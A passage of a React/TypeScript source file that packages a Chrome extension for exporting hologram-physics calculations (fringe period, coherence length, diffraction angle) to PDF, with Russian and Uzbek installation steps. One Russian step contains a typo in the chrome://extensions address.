              ? '\\u2192  \\u0412\\u044b\\u0432\\u043e\\u0434: \\u0441\\u0442\\u0430\\u043d\\u0434\\u0430\\u0440\\u0442\\u043d\\u0430\\u044f \\u0433\\u043e\\u043b\\u043e\\u0433\\u0440\\u0430\\u0444\\u0438\\u0447\\u0435\\u0441\\u043a\\u0430\\u044f \\u043f\\u043b\\u0451\\u043d\\u043a\\u0430 \\u043f\\u043e\\u0434\\u0445\\u043e\\u0434\\u0438\\u0442 (\\u2264 5000 \\u043b\\u0438\\u043d/\\u043c\\u043c)'
              : '\\u2192  \\u0412\\u044b\\u0432\\u043e\\u0434: \\u0442\\u0440\\u0435\\u0431\\u0443\\u0435\\u0442\\u0441\\u044f \\u0441\\u043f\\u0435\\u0446\\u0438\\u0430\\u043b\\u044c\\u043d\\u0430\\u044f \\u043f\\u043b\\u0451\\u043d\\u043a\\u0430 (> 5000 \\u043b\\u0438\\u043d/\\u043c\\u043c)',
          ]
        },
        {
          title: '\\u0428\\u0430\\u0433 3.  \\u0414\\u043b\\u0438\\u043d\\u0430 \\u043a\\u043e\\u0433\\u0435\\u0440\\u0435\\u043d\\u0442\\u043d\\u043e\\u0441\\u0442\\u0438 \\u0438 \\u043c\\u0430\\u043a\\u0441. \\u0433\\u043b\\u0443\\u0431\\u0438\\u043d\\u0430 \\u0441\\u0446\\u0435\\u043d\\u044b (Lc)',
          lines: [
            'Lc = \\u03bb\\u00b2 / \\u0394\\u03bb',
            'Lc = (' + lam.toFixed(2) + ')\\u00b2  /  ' + dl.toFixed(4),
            'Lc = ' + (lam * lam).toFixed(2) + '  /  ' + dl.toFixed(4),
            'Lc = ' + d.results.Lc_mm.toFixed(3) + ' \\u043c\\u043c  =  ' + d.results.Lc_cm.toFixed(4) + ' \\u0441\\u043c',
            '\\u2192  \\u041c\\u0430\\u043a\\u0441\\u0438\\u043c\\u0430\\u043b\\u044c\\u043d\\u0430\\u044f \\u0433\\u043b\\u0443\\u0431\\u0438\\u043d\\u0430 \\u0437\\u0430\\u043f\\u0438\\u0441\\u044b\\u0432\\u0430\\u0435\\u043c\\u043e\\u0433\\u043e \\u043e\\u0431\\u044a\\u0435\\u043a\\u0442\\u0430: ' + d.results.Lc_cm.toFixed(2) + ' \\u0441\\u043c',
          ]
        },
        {
          title: '\\u0428\\u0430\\u0433 4.  \\u0423\\u0433\\u043e\\u043b \\u0434\\u0438\\u0444\\u0440\\u0430\\u043a\\u0446\\u0438\\u0438 \\u043f\\u0435\\u0440\\u0432\\u043e\\u0433\\u043e \\u043f\\u043e\\u0440\\u044f\\u0434\\u043a\\u0430 (\\u03b1)',
          lines: [
            '\\u03b1 = arcsin(\\u03bb / d)',
            '\\u03b1 = arcsin(' + lam.toFixed(2) + ' / ' + d.results.d_nm.toFixed(3) + ')',
            '\\u03b1 = arcsin(' + (lam / d.results.d_nm).toFixed(5) + ')',
            isNaN(d.results.alpha_deg)
              ? '\\u03b1 \\u2014 \\u043d\\u0435 \\u043e\\u043f\\u0440\\u0435\\u0434\\u0435\\u043b\\u0435\\u043d\\u043e  (\\u03bb > d,  \\u0443\\u0433\\u043e\\u043b \\u043d\\u0435 \\u0441\\u0443\\u0449\\u0435\\u0441\\u0442\\u0432\\u0443\\u0435\\u0442)'
              : '\\u03b1 = ' + d.results.alpha_deg.toFixed(3) + '\\u00b0',
            isNaN(d.results.alpha_deg) ? ''
              : '\\u2192  \\u0412\\u043e\\u0441\\u0441\\u0442\\u0430\\u043d\\u043e\\u0432\\u043b\\u0435\\u043d\\u043d\\u043e\\u0435 3D-\\u0438\\u0437\\u043e\\u0431\\u0440\\u0430\\u0436\\u0435\\u043d\\u0438\\u0435 \\u043d\\u0430\\u0431\\u043b\\u044e\\u0434\\u0430\\u0435\\u0442\\u0441\\u044f \\u043f\\u043e\\u0434 \\u0443\\u0433\\u043b\\u043e\\u043c ' + d.results.alpha_deg.toFixed(2) + '\\u00b0 \\u043e\\u0442 \\u043d\\u043e\\u0440\\u043c\\u0430\\u043b\\u0438',
          ]
        },
      ];

      steps.forEach(function(s) {
        needPage(50);
        setMain(10, 'bold'); rgb(20, 60, 120);
        doc.text(s.title, ML + 2, y); y += 5;
        monoBlock(s.lines.filter(Boolean));
        y += 2;
      });
    }

    if (chkTable) {
      sectionHead(4, '\\u0421\\u0412\\u041e\\u0414\\u041d\\u0410\\u042f \\u0422\\u0410\\u0411\\u041b\\u0418\\u0426\\u0410 \\u0420\\u0415\\u0417\\u0423\\u041b\\u042c\\u0422\\u0410\\u0422\\u041e\\u0412');

      var trows = [
        ['\\u041f\\u0435\\u0440\\u0438\\u043e\\u0434 \\u0438\\u043d\\u0442\\u0435\\u0440\\u0444\\u0435\\u0440\\u0435\\u043d\\u0446\\u0438\\u043e\\u043d\\u043d\\u044b\\u0445 \\u043f\\u043e\\u043b\\u043e\\u0441', 'd',  d.results.d_nm.toFixed(2) + ' \\u043d\\u043c'],
        ['\\u041f\\u0435\\u0440\\u0438\\u043e\\u0434 \\u0438\\u043d\\u0442\\u0435\\u0440\\u0444\\u0435\\u0440\\u0435\\u043d\\u0446\\u0438\\u043e\\u043d\\u043d\\u044b\\u0445 \\u043f\\u043e\\u043b\\u043e\\u0441', 'd',  d.results.d_um.toFixed(4) + ' \\u043c\\u043a\\u043c'],
        ['\\u0420\\u0430\\u0437\\u0440\\u0435\\u0448\\u0435\\u043d\\u0438\\u0435 \\u043f\\u043b\\u0451\\u043d\\u043a\\u0438',              'N',  d.results.N.toFixed(1) + ' \\u043b\\u0438\\u043d/\\u043c\\u043c'],
        ['\\u0414\\u043b\\u0438\\u043d\\u0430 \\u043a\\u043e\\u0433\\u0435\\u0440\\u0435\\u043d\\u0442\\u043d\\u043e\\u0441\\u0442\\u0438',  'Lc', d.results.Lc_mm.toFixed(3) + ' \\u043c\\u043c'],
        ['\\u041c\\u0430\\u043a\\u0441. \\u0433\\u043b\\u0443\\u0431\\u0438\\u043d\\u0430 \\u0441\\u0446\\u0435\\u043d\\u044b',            'Lc', d.results.Lc_cm.toFixed(4) + ' \\u0441\\u043c'],
        ['\\u0423\\u0433\\u043e\\u043b \\u0434\\u0438\\u0444\\u0440\\u0430\\u043a\\u0446\\u0438\\u0438 (m = 1)',                          '\\u03b1',  isNaN(d.results.alpha_deg) ? 'N/A' : d.results.alpha_deg.toFixed(2) + '\\u00b0'],
        ['\\u0421\\u043e\\u0432\\u043c\\u0435\\u0441\\u0442\\u0438\\u043c\\u043e\\u0441\\u0442\\u044c \\u0441 \\u043f\\u043b\\u0451\\u043d\\u043a\\u043e\\u0439', '\\u2014', d.results.N <= 5000 ? '\\u041f\\u043e\\u0434\\u0445\\u043e\\u0434\\u0438\\u0442  \\u2713' : '\\u0422\\u0440\\u0435\\u0431\\u0443\\u0435\\u0442\\u0441\\u044f \\u0441\\u043f\\u0435\\u0446. \\u043f\\u043b\\u0451\\u043d\\u043a\\u0430  \\u26a0'],
      ];

      var rH = 9, hH = 9;
      needPage(trows.length * rH + hH + 6);

      fill(20, 60, 120); stroke(20, 60, 120);
      doc.rect(ML, y, CW, hH, 'F');
      setMain(9, 'bold'); rgb(255, 255, 255);
      doc.text('\\u041f\\u0430\\u0440\\u0430\\u043c\\u0435\\u0442\\u0440',     ML + 4,       y + 6);
      doc.text('\\u0421\\u0438\\u043c\\u0432\\u043e\\u043b',                   ML + 110,     y + 6);
      doc.text('\\u0417\\u043d\\u0430\\u0447\\u0435\\u043d\\u0438\\u0435',      ML + CW - 4,  y + 6, { align: 'right' });
      y += hH;

      trows.forEach(function(row, i) {
        var ok   = row[2].indexOf('\\u2713') !== -1;
        var warn = row[2].indexOf('\\u26a0') !== -1;
        fill(i % 2 === 0 ? 248 : 255, i % 2 === 0 ? 250 : 255, 255);
        stroke(200, 215, 235);
        doc.setLineWidth(0.2);
        doc.rect(ML, y, CW, rH, 'FD');
        setMain(9); rgb(30, 30, 30);
        doc.text(row[0], ML + 4, y + 6);
        setMono(9); rgb(0, 80, 160);
        doc.text(row[1], ML + 114, y + 6);
        setMono(10);
        rgb(ok ? 0 : warn ? 160 : 0, ok ? 120 : warn ? 80 : 80, ok ? 0 : warn ? 0 : 160);
        doc.text(row[2], ML + CW - 4, y + 6, { align: 'right' });
        y += rH;
      });
      y += 6;
    }

    if (chkTheory) {
      sectionHead(5, '\\u041f\\u0420\\u0418\\u041d\\u0426\\u0418\\u041f \\u0420\\u0410\\u0411\\u041e\\u0422\\u042b \\u0422\\u0420\\u0410\\u041d\\u0421\\u041c\\u0418\\u0421\\u0421\\u0418\\u041e\\u041d\\u041d\\u041e\\u0419 \\u0413\\u041e\\u041b\\u041e\\u0413\\u0420\\u0410\\u041c\\u041c\\u042b');
      var paras = [
        '\\u0422\\u0440\\u0430\\u043d\\u0441\\u043c\\u0438\\u0441\\u0441\\u0438\\u043e\\u043d\\u043d\\u0430\\u044f \\u0433\\u043e\\u043b\\u043e\\u0433\\u0440\\u0430\\u043c\\u043c\\u0430 \\u2014 \\u044d\\u0442\\u043e \\u0438\\u043d\\u0442\\u0435\\u0440\\u0444\\u0435\\u0440\\u0435\\u043d\\u0446\\u0438\\u043e\\u043d\\u043d\\u0430\\u044f \\u043a\\u0430\\u0440\\u0442\\u0438\\u043d\\u0430, \\u0437\\u0430\\u043f\\u0438\\u0441\\u0430\\u043d\\u043d\\u0430\\u044f \\u043d\\u0430 \\u0441\\u0432\\u0435\\u0442\\u043e\\u0447\\u0443\\u0432\\u0441\\u0442\\u0432\\u0438\\u0442\\u0435\\u043b\\u044c\\u043d\\u043e\\u0439 \\u0444\\u043e\\u0442\\u043e\\u044d\\u043c\\u0443\\u043b\\u044c\\u0441\\u0438\\u0438. \\u0413\\u043e\\u043b\\u043e\\u0433\\u0440\\u0430\\u043c\\u043c\\u0430 \\u0441\\u043e\\u0445\\u0440\\u0430\\u043d\\u044f\\u0435\\u0442 \\u043d\\u0435 \\u0442\\u043e\\u043b\\u044c\\u043a\\u043e \\u0430\\u043c\\u043f\\u043b\\u0438\\u0442\\u0443\\u0434\\u0443 \\u0432\\u043e\\u043b\\u043d\\u044b, \\u043d\\u043e \\u0438 \\u0435\\u0451 \\u0444\\u0430\\u0437\\u0443 \\u2014 \\u0447\\u0442\\u043e \\u043f\\u043e\\u0437\\u0432\\u043e\\u043b\\u044f\\u0435\\u0442 \\u0432\\u043e\\u0441\\u0441\\u0442\\u0430\\u043d\\u043e\\u0432\\u0438\\u0442\\u044c \\u043f\\u043e\\u043b\\u043d\\u0443\\u044e \\u0442\\u0440\\u0451\\u0445\\u043c\\u0435\\u0440\\u043d\\u0443\\u044e \\u0438\\u043d\\u0444\\u043e\\u0440\\u043c\\u0430\\u0446\\u0438\\u044e \\u043e\\u0431 \\u043e\\u0431\\u044a\\u0435\\u043a\\u0442\\u0435.',
        '\\u0417\\u0410\\u041f\\u0418\\u0421\\u042c: \\u041a\\u043e\\u0433\\u0435\\u0440\\u0435\\u043d\\u0442\\u043d\\u044b\\u0439 \\u043b\\u0430\\u0437\\u0435\\u0440\\u043d\\u044b\\u0439 \\u043f\\u0443\\u0447\\u043e\\u043a \\u0434\\u0435\\u043b\\u0438\\u0442\\u0441\\u044f \\u0441\\u0432\\u0435\\u0442\\u043e\\u0434\\u0435\\u043b\\u0438\\u0442\\u0435\\u043b\\u0435\\u043c \\u043d\\u0430 \\u0434\\u0432\\u0430 \\u2014 \\u043e\\u043f\\u043e\\u0440\\u043d\\u044b\\u0439 \\u0438 \\u043e\\u0431\\u044a\\u0435\\u043a\\u0442\\u043d\\u044b\\u0439. \\u041e\\u0431\\u044a\\u0435\\u043a\\u0442\\u043d\\u044b\\u0439 \\u043b\\u0443\\u0447 \\u043e\\u0442\\u0440\\u0430\\u0436\\u0430\\u0435\\u0442\\u0441\\u044f \\u043e\\u0442 \\u043f\\u0440\\u0435\\u0434\\u043c\\u0435\\u0442\\u0430 \\u0438 \\u043d\\u0435\\u0441\\u0451\\u0442 \\u0438\\u043d\\u0444\\u043e\\u0440\\u043c\\u0430\\u0446\\u0438\\u044e \\u043e \\u0435\\u0433\\u043e \\u0444\\u043e\\u0440\\u043c\\u0435. \\u041d\\u0430 \\u043f\\u043b\\u0451\\u043d\\u043a\\u0435 \\u043e\\u0431\\u0430 \\u043b\\u0443\\u0447\\u0430 \\u0438\\u043d\\u0442\\u0435\\u0440\\u0444\\u0435\\u0440\\u0438\\u0440\\u0443\\u044e\\u0442, \\u0441\\u043e\\u0437\\u0434\\u0430\\u0432\\u0430\\u044f \\u0441\\u0438\\u0441\\u0442\\u0435\\u043c\\u0443 \\u043c\\u0438\\u043a\\u0440\\u043e\\u0441\\u043a\\u043e\\u043f\\u0438\\u0447\\u0435\\u0441\\u043a\\u0438\\u0445 \\u043f\\u043e\\u043b\\u043e\\u0441 \\u0441 \\u043f\\u0435\\u0440\\u0438\\u043e\\u0434\\u043e\\u043c d = \\u03bb/(2\\u00b7sin(\\u03b8/2)).',
        '\\u0412\\u041e\\u0421\\u0421\\u0422\\u0410\\u041d\\u041e\\u0412\\u041b\\u0415\\u041d\\u0418\\u0415: \\u041f\\u0440\\u0438 \\u043e\\u0441\\u0432\\u0435\\u0449\\u0435\\u043d\\u0438\\u0438 \\u0433\\u043e\\u043b\\u043e\\u0433\\u0440\\u0430\\u043c\\u043c\\u044b \\u043e\\u043f\\u043e\\u0440\\u043d\\u044b\\u043c \\u043b\\u0430\\u0437\\u0435\\u0440\\u043d\\u044b\\u043c \\u043f\\u0443\\u0447\\u043a\\u043e\\u043c \\u043f\\u0440\\u043e\\u0438\\u0441\\u0445\\u043e\\u0434\\u0438\\u0442 \\u0434\\u0438\\u0444\\u0440\\u0430\\u043a\\u0446\\u0438\\u044f. \\u041f\\u0435\\u0440\\u0432\\u044b\\u0439 \\u043f\\u043e\\u0440\\u044f\\u0434\\u043e\\u043a (+1) \\u0432\\u043e\\u0441\\u0441\\u0442\\u0430\\u043d\\u0430\\u0432\\u043b\\u0438\\u0432\\u0430\\u0435\\u0442 \\u0438\\u0441\\u0445\\u043e\\u0434\\u043d\\u0443\\u044e \\u043e\\u0431\\u044a\\u0435\\u043a\\u0442\\u043d\\u0443\\u044e \\u0432\\u043e\\u043b\\u043d\\u0443 \\u2014 \\u043d\\u0430\\u0431\\u043b\\u044e\\u0434\\u0430\\u0442\\u0435\\u043b\\u044c \\u0432\\u0438\\u0434\\u0438\\u0442 \\u0442\\u0440\\u0451\\u0445\\u043c\\u0435\\u0440\\u043d\\u043e\\u0435 \\u0432\\u0438\\u0440\\u0442\\u0443\\u0430\\u043b\\u044c\\u043d\\u043e\\u0435 \\u0438\\u0437\\u043e\\u0431\\u0440\\u0430\\u0436\\u0435\\u043d\\u0438\\u0435.',
        '\\u041a\\u041b\\u042e\\u0427\\u0415\\u0412\\u041e\\u0415 \\u0421\\u0412\\u041e\\u0419\\u0421\\u0422\\u0412\\u041e: \\u041a\\u0430\\u0436\\u0434\\u044b\\u0439 \\u0444\\u0440\\u0430\\u0433\\u043c\\u0435\\u043d\\u0442 \\u0433\\u043e\\u043b\\u043e\\u0433\\u0440\\u0430\\u043c\\u043c\\u044b \\u0441\\u043e\\u0434\\u0435\\u0440\\u0436\\u0438\\u0442 \\u043f\\u043e\\u043b\\u043d\\u043e\\u0435 \\u0438\\u0437\\u043e\\u0431\\u0440\\u0430\\u0436\\u0435\\u043d\\u0438\\u0435 \\u2014 \\u043b\\u0438\\u0448\\u044c \\u0443\\u043c\\u0435\\u043d\\u044c\\u0448\\u0430\\u0435\\u0442\\u0441\\u044f \\u0443\\u0433\\u043e\\u043b \\u043e\\u0431\\u0437\\u043e\\u0440\\u0430.',
      ];
      paras.forEach(function(p) { bodyLine(p, 2, 10); y += 3; });
      y += 4;
    }

    if (chkComparison) {
      sectionHead(6, '\\u0421\\u0420\\u0410\\u0412\\u041d\\u0415\\u041d\\u0418\\u0415: TRANSMISSION vs REFLECTION');

      var cols = [ML, ML + 72, ML + 132];

      fill(20, 60, 120); doc.rect(ML, y, CW, 9, 'F');
      setMain(8, 'bold'); rgb(255, 255, 255);
      doc.text('\\u041f\\u0430\\u0440\\u0430\\u043c\\u0435\\u0442\\u0440',  cols[0] + 2, y + 6);
      doc.text('Transmission', cols[1] + 2, y + 6);
      doc.text('Reflection',   cols[2] + 2, y + 6);
      y += 10;

      var crows = [
        ['\\u0413\\u0435\\u043e\\u043c\\u0435\\u0442\\u0440\\u0438\\u044f \\u0437\\u0430\\u043f\\u0438\\u0441\\u0438',       '\\u041b\\u0443\\u0447\\u0438 \\u0441 \\u043e\\u0434\\u043d\\u043e\\u0439 \\u0441\\u0442\\u043e\\u0440\\u043e\\u043d\\u044b',  '\\u041b\\u0443\\u0447\\u0438 \\u0441 \\u0434\\u0432\\u0443\\u0445 \\u0441\\u0442\\u043e\\u0440\\u043e\\u043d'],
        ['\\u041f\\u0440\\u043e\\u0441\\u043c\\u043e\\u0442\\u0440',                  '\\u041b\\u0430\\u0437\\u0435\\u0440 \\u0441\\u0437\\u0430\\u0434\\u0438 \\u043f\\u043b\\u0451\\u043d\\u043a\\u0438', '\\u0411\\u0435\\u043b\\u044b\\u0439 \\u0441\\u0432\\u0435\\u0442 \\u0441\\u043f\\u0435\\u0440\\u0435\\u0434\\u0438'],
        ['\\u0426\\u0432\\u0435\\u0442\\u043e\\u043f\\u0435\\u0440\\u0435\\u0434\\u0430\\u0447\\u0430',              '\\u041e\\u0434\\u043d\\u043e\\u0446\\u0432\\u0435\\u0442\\u043d\\u0430\\u044f',                 '\\u041c\\u043d\\u043e\\u0433\\u043e\\u0446\\u0432\\u0435\\u0442\\u043d\\u0430\\u044f'],
        ['\\u0414\\u0438\\u0441\\u043f\\u0435\\u0440\\u0441\\u0438\\u044f',                  '\\u0412\\u044b\\u0441\\u043e\\u043a\\u0430\\u044f',                       '\\u041d\\u0438\\u0437\\u043a\\u0430\\u044f (\\u0411\\u0440\\u044d\\u0433\\u0433)'],
        ['\\u0422\\u0438\\u043f \\u0440\\u0435\\u0448\\u0451\\u0442\\u043a\\u0438',              '\\u041f\\u043b\\u043e\\u0441\\u043a\\u0430\\u044f (2D)',                  '\\u041e\\u0431\\u044a\\u0451\\u043c\\u043d\\u0430\\u044f (3D \\u0411\\u0440\\u044d\\u0433\\u0433)'],
        ['\\u0423\\u0433\\u043b\\u043e\\u0432\\u0430\\u044f \\u0441\\u0435\\u043b\\u0435\\u043a\\u0442\\u0438\\u0432\\u043d\\u043e\\u0441\\u0442\\u044c', '\\u041d\\u0438\\u0437\\u043a\\u0430\\u044f',                      '\\u0412\\u044b\\u0441\\u043e\\u043a\\u0430\\u044f'],
        ['\\u041f\\u0440\\u0438\\u043c\\u0435\\u043d\\u0435\\u043d\\u0438\\u0435',               '\\u041b\\u0430\\u0431\\u043e\\u0440\\u0430\\u0442\\u043e\\u0440\\u0438\\u044f, \\u043d\\u0430\\u0443\\u043a\\u0430', '\\u0411\\u0430\\u043d\\u043a\\u043d\\u043e\\u0442\\u044b, \\u043f\\u0430\\u0441\\u043f\\u043e\\u0440\\u0442\\u0430, \\u0430\\u0440\\u0442'],
      ];
      crows.forEach(function(row, i) {
        needPage(9);
        fill(i % 2 === 0 ? 246 : 255, i % 2 === 0 ? 249 : 255, 255);
        stroke(200, 215, 235); doc.setLineWidth(0.2);
        doc.rect(ML, y, CW, 9, 'FD');
        setMain(8); rgb(30, 30, 30);
        doc.text(row[0], cols[0] + 2, y + 6);
        rgb(0, 80, 160);
        doc.text(row[1], cols[1] + 2, y + 6);
        rgb(100, 0, 150);
        doc.text(row[2], cols[2] + 2, y + 6);
        y += 9;
      });
    }

    footer();

    var filename = 'hologram-calc-' + date.replace(/\\./g, '-') + '.pdf';
    doc.save(filename);

  } catch (err) {
    console.error('PDF error:', err);
    alert('\\u041e\\u0448\\u0438\\u0431\\u043a\\u0430 \\u0433\\u0435\\u043d\\u0435\\u0440\\u0430\\u0446\\u0438\\u0438 PDF:\\n' + err.message);
  } finally {
    downloadBtn.disabled = false;
    downloadBtn.querySelector('span').textContent = '\\u2b07 \\u0421\\u043a\\u0430\\u0447\\u0430\\u0442\\u044c PDF';
  }
}`;

const ICON_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128">
  <defs>
    <linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#00E5FF"/>
      <stop offset="100%" style="stop-color:#9C27B0"/>
    </linearGradient>
  </defs>
  <rect width="128" height="128" rx="24" fill="#0D1526"/>
  <line x1="24" y1="30" x2="104" y2="30" stroke="url(#g)" stroke-width="4" opacity="0.9"/>
  <line x1="24" y1="44" x2="104" y2="44" stroke="url(#g)" stroke-width="3" opacity="0.7"/>
  <line x1="24" y1="58" x2="104" y2="58" stroke="url(#g)" stroke-width="4" opacity="0.9"/>
  <line x1="24" y1="72" x2="104" y2="72" stroke="url(#g)" stroke-width="3" opacity="0.7"/>
  <line x1="24" y1="86" x2="104" y2="86" stroke="url(#g)" stroke-width="4" opacity="0.9"/>
  <line x1="24" y1="100" x2="104" y2="100" stroke="url(#g)" stroke-width="3" opacity="0.7"/>
  <text x="64" y="70" font-family="monospace" font-size="18" font-weight="bold" fill="#00E5FF" text-anchor="middle">PDF</text>
</svg>`;

const README = `Hologram Calculator — PDF Export Extension
==========================================

Установка:
1. Распакуйте этот архив в любую папку
2. Откройте Chrome и перейдите на chrome://extensions
3. Включите "Режим разработчика" (переключатель справа вверху)
4. Нажмите "Загрузить распакованное расширение"
5. Выберите папку hologram-extension (эту папку)

Использование:
1. Откройте приложение Hologram Calculator
2. Перейдите на вкладку "Математика"
3. Настройте параметры (λ, θ, Δλ)
4. Нажмите на иконку расширения в панели Chrome
5. Заполните имя автора и название работы
6. Нажмите "⬇ Скачать PDF"

Совместимость: Chrome 88+, Edge 88+
Версия: 1.0.0
`;

// ---------------------------------------------------------------------------
// Component
// ---------------------------------------------------------------------------

const STEPS = {
  ru: [
    { icon: '📂', text: 'Найдите скачанный файл', sub: 'hologram-pdf-extension.zip' },
    { icon: '🗜️', text: 'Распакуйте архив', sub: 'ПКМ → Извлечь всё / 7-Zip / WinRAR' },
    { icon: '🌐', text: 'Откройте Chrome и введите в адресной строке', sub: 'chrome://extensionsss', copy: true },
    { icon: '🔧', text: 'Включите «Режим разработчика»', sub: 'Переключатель в правом верхнем углу' },
    { icon: '📦', text: 'Нажмите «Загрузить распакованное расширение»', sub: 'И выберите папку hologram-extension' },
    { icon: '✅', text: 'Готово! Откройте вкладку Математика', sub: 'Нажмите иконку расширения → Скачать PDF' },
  ],
  uz: [
    { icon: '📂', text: 'Yuklab olingan faylni toping', sub: 'hologram-pdf-extension.zip' },
    { icon: '🗜️', text: 'Arxivni ochib oling', sub: 'ПКМ → Barchasini chiqarish / 7-Zip / WinRAR' },
    { icon: '🌐', text: 'Chrome ochib manzil satriga kiriting', sub: 'chrome://extensions', copy: true },
    { icon: '🔧', text: '«Ishlab chiquvchi rejim»ni yoqing', sub: 'O\'ng yuqori burchakdagi tugma' },
    { icon: '📦', text: '«Ochilmagan kengaytmani yuklash»ni bosing', sub: 'hologram-extension papkasini tanlang' },
    { icon: '✅', text: 'Tayyor! Matematika bo\'limini oching', sub: 'Kengaytma ikonkasi → PDF yuklab olish' },
  ],
};

export default function ExtensionDownload() {
  const { lang } = useLang();
  const [status, setStatus] = useState<'idle' | 'loading' | 'error'>('idle');
  const [showModal, setShowModal] = useState(false);
  const [copied, setCopied] = useState(false);

  async function handleDownload() {
    setStatus('loading');
    try {
      const JSZip = (await import('jszip')).default;
      const zip = new JSZip();
      const folder = zip.folder('hologram-extension')!;

      folder.file('manifest.json', MANIFEST);
      folder.file('content.js', CONTENT_JS);
      folder.file('service-worker.js', SERVICE_WORKER);
      folder.file('popup.html', POPUP_HTML);
      folder.file('popup.css', POPUP_CSS);
      folder.file('popup.js', POPUP_JS);
      folder.file('icon-16.svg', ICON_SVG);
      folder.file('icon-48.svg', ICON_SVG);
      folder.file('icon-128.svg', ICON_SVG);
      folder.file('README.txt', README);

      const jspdfRes = await fetch('/jspdf.umd.min.js');
      if (!jspdfRes.ok) throw new Error('Failed to fetch jsPDF');
      folder.file('jspdf.umd.min.js', await jspdfRes.arrayBuffer());

      const fontRes = await fetch('/fonts/NotoSans-Regular.ttf');
      if (!fontRes.ok) throw new Error('Failed to fetch NotoSans font');
      folder.file('fonts/NotoSans-Regular.ttf', await fontRes.arrayBuffer());

      const blob = await zip.generateAsync({ type: 'blob', compression: 'DEFLATE' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'hologram-pdf-extension.zip';
      a.click();
      URL.revokeObjectURL(url);
      setStatus('idle');
      setShowModal(true);
    } catch (e) {
      console.error(e);
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  }

  function handleCopy(text: string) {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }

  const steps = STEPS[lang];

  return (
    <>
      {/* Download bar */}
      <div
        className="flex items-center gap-4 rounded-xl px-5 py-3"
        style={{ background: 'linear-gradient(135deg, #0D1F38, #1A0D2E)', border: '1px solid #00E5FF44' }}
      >
        <div className="text-2xl">📄</div>
        <div className="flex-1 min-w-0">
          <div className="font-semibold text-sm" style={{ color: '#00E5FF' }}>
            {lang === 'ru' ? 'Экспорт в PDF для диссертации' : 'Dissertatsiya uchun PDFga eksport'}
          </div>
          <div className="text-xs mt-0.5" style={{ color: '#90A4AE' }}>
            {lang === 'ru'
              ? 'Chrome-расширение: скачайте ZIP → распакуйте → установите в chrome://extensions'
              : "Chrome kengaytmasi: ZIP yuklab oling → chiqaring → chrome://extensions da o'rnating"}
          </div>
        </div>
        <button
          onClick={handleDownload}
          disabled={status === 'loading'}
          className="shrink-0 text-xs font-semibold px-4 py-2 rounded-lg transition-opacity hover:opacity-80 disabled:opacity-50"
          style={{ background: 'linear-gradient(135deg, #00E5FF, #1565C0)', color: '#fff', border: 'none', cursor: 'pointer' }}
        >
          {status === 'loading'
            ? (lang === 'ru' ? '⟳ Упаковка...' : '⟳ Paketlanmoqda...')
            : status === 'error'
              ? (lang === 'ru' ? '✗ Ошибка' : '✗ Xato')
              : (lang === 'ru' ? '⬇ Скачать .zip' : '⬇ .zip yuklab olish')}
        </button>
        <button
          onClick={() => setShowModal(true)}
          className="shrink-0 text-xs rounded-lg px-3 py-2 hidden sm:block transition-colors"
          style={{ background: '#111827', border: '1px solid #1E3A5F', color: '#546E7A', fontFamily: 'monospace', cursor: 'pointer' }}
          title={lang === 'ru' ? 'Инструкция по установке' : 'O\'rnatish yo\'riqnomasi'}
        >
          ? как установить
        </button>
      </div>

      {/* Modal */}
      {showModal && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4"
          style={{ background: 'rgba(0,0,0,0.75)' }}
          onClick={(e) => { if (e.target === e.currentTarget) setShowModal(false); }}
        >
          <div
            className="w-full max-w-md rounded-2xl overflow-hidden"
            style={{ background: '#0D1526', border: '1px solid #1E3A5F', boxShadow: '0 24px 64px rgba(0,0,0,0.6)' }}
          >
            {/* Modal header */}
            <div
              className="flex items-center justify-between px-6 py-4"
              style={{ background: '#111827', borderBottom: '1px solid #1E3A5F' }}
            >
              <div className="flex items-center gap-3">
                <span className="text-xl">📦</span>
                <div>
                  <div className="font-bold text-sm" style={{ color: '#00E5FF' }}>
                    {lang === 'ru' ? 'Установка расширения' : 'Kengaytmani o\'rnatish'}
                  </div>
                  <div className="text-xs" style={{ color: '#546E7A' }}>
                    {lang === 'ru' ? 'Chrome / Edge / Brave' : 'Chrome / Edge / Brave'}
                  </div>
                </div>
              </div>
              <button
                onClick={() => setShowModal(false)}
                className="text-lg leading-none transition-colors hover:text-white"
                style={{ color: '#546E7A', background: 'none', border: 'none', cursor: 'pointer', padding: '4px 8px' }}
              >
                ✕
              </button>
            </div>

            {/* Steps */}
            <div className="px-6 py-4 flex flex-col gap-3">
              {steps.map((step, i) => (
                <div key={i} className="flex items-start gap-3">
                  {/* Step number + icon */}
                  <div className="flex flex-col items-center shrink-0" style={{ width: 32 }}>
                    <div
                      className="w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold"
                      style={{ background: i === steps.length - 1 ? '#00402A' : '#0D1F38', border: `1px solid ${i === steps.length - 1 ? '#00E676' : '#1E3A5F'}`, color: i === steps.length - 1 ? '#00E676' : '#00E5FF' }}
                    >
                      {i + 1}
                    </div>
                    {i < steps.length - 1 && (
                      <div className="w-px mt-1" style={{ height: 16, background: '#1E3A5F' }} />
                    )}
                  </div>

                  {/* Text */}
                  <div className="flex-1 min-w-0 pb-1">
                    <div className="text-sm font-medium" style={{ color: '#E8EAF6' }}>
                      {step.icon} {step.text}
                    </div>
                    {step.copy ? (
                      <div className="flex items-center gap-2 mt-1">
                        <code
                          className="text-xs px-2 py-1 rounded"
                          style={{ background: '#060B18', border: '1px solid #1E3A5F', color: '#00E5FF', fontFamily: 'monospace' }}
                        >
                          {step.sub}
                        </code>
                        <button
                          onClick={() => handleCopy(step.sub)}
                          className="text-xs px-2 py-1 rounded transition-all"
                          style={{
                            background: copied ? '#00402A' : '#1E3A5F',
                            border: `1px solid ${copied ? '#00E676' : '#2A4A7F'}`,
                            color: copied ? '#00E676' : '#90A4AE',
                            cursor: 'pointer',
                            fontFamily: 'monospace',
                          }}
                        >
                          {copied ? '✓ скопировано' : '⎘ копировать'}
                        </button>
                      </div>
                    ) : (
                      <div className="text-xs mt-0.5" style={{ color: '#546E7A' }}>{step.sub}</div>
                    )}
                  </div>
                </div>
              ))}
            </div>

            {/* Footer */}
            <div
              className="px-6 py-3 flex items-center justify-between"
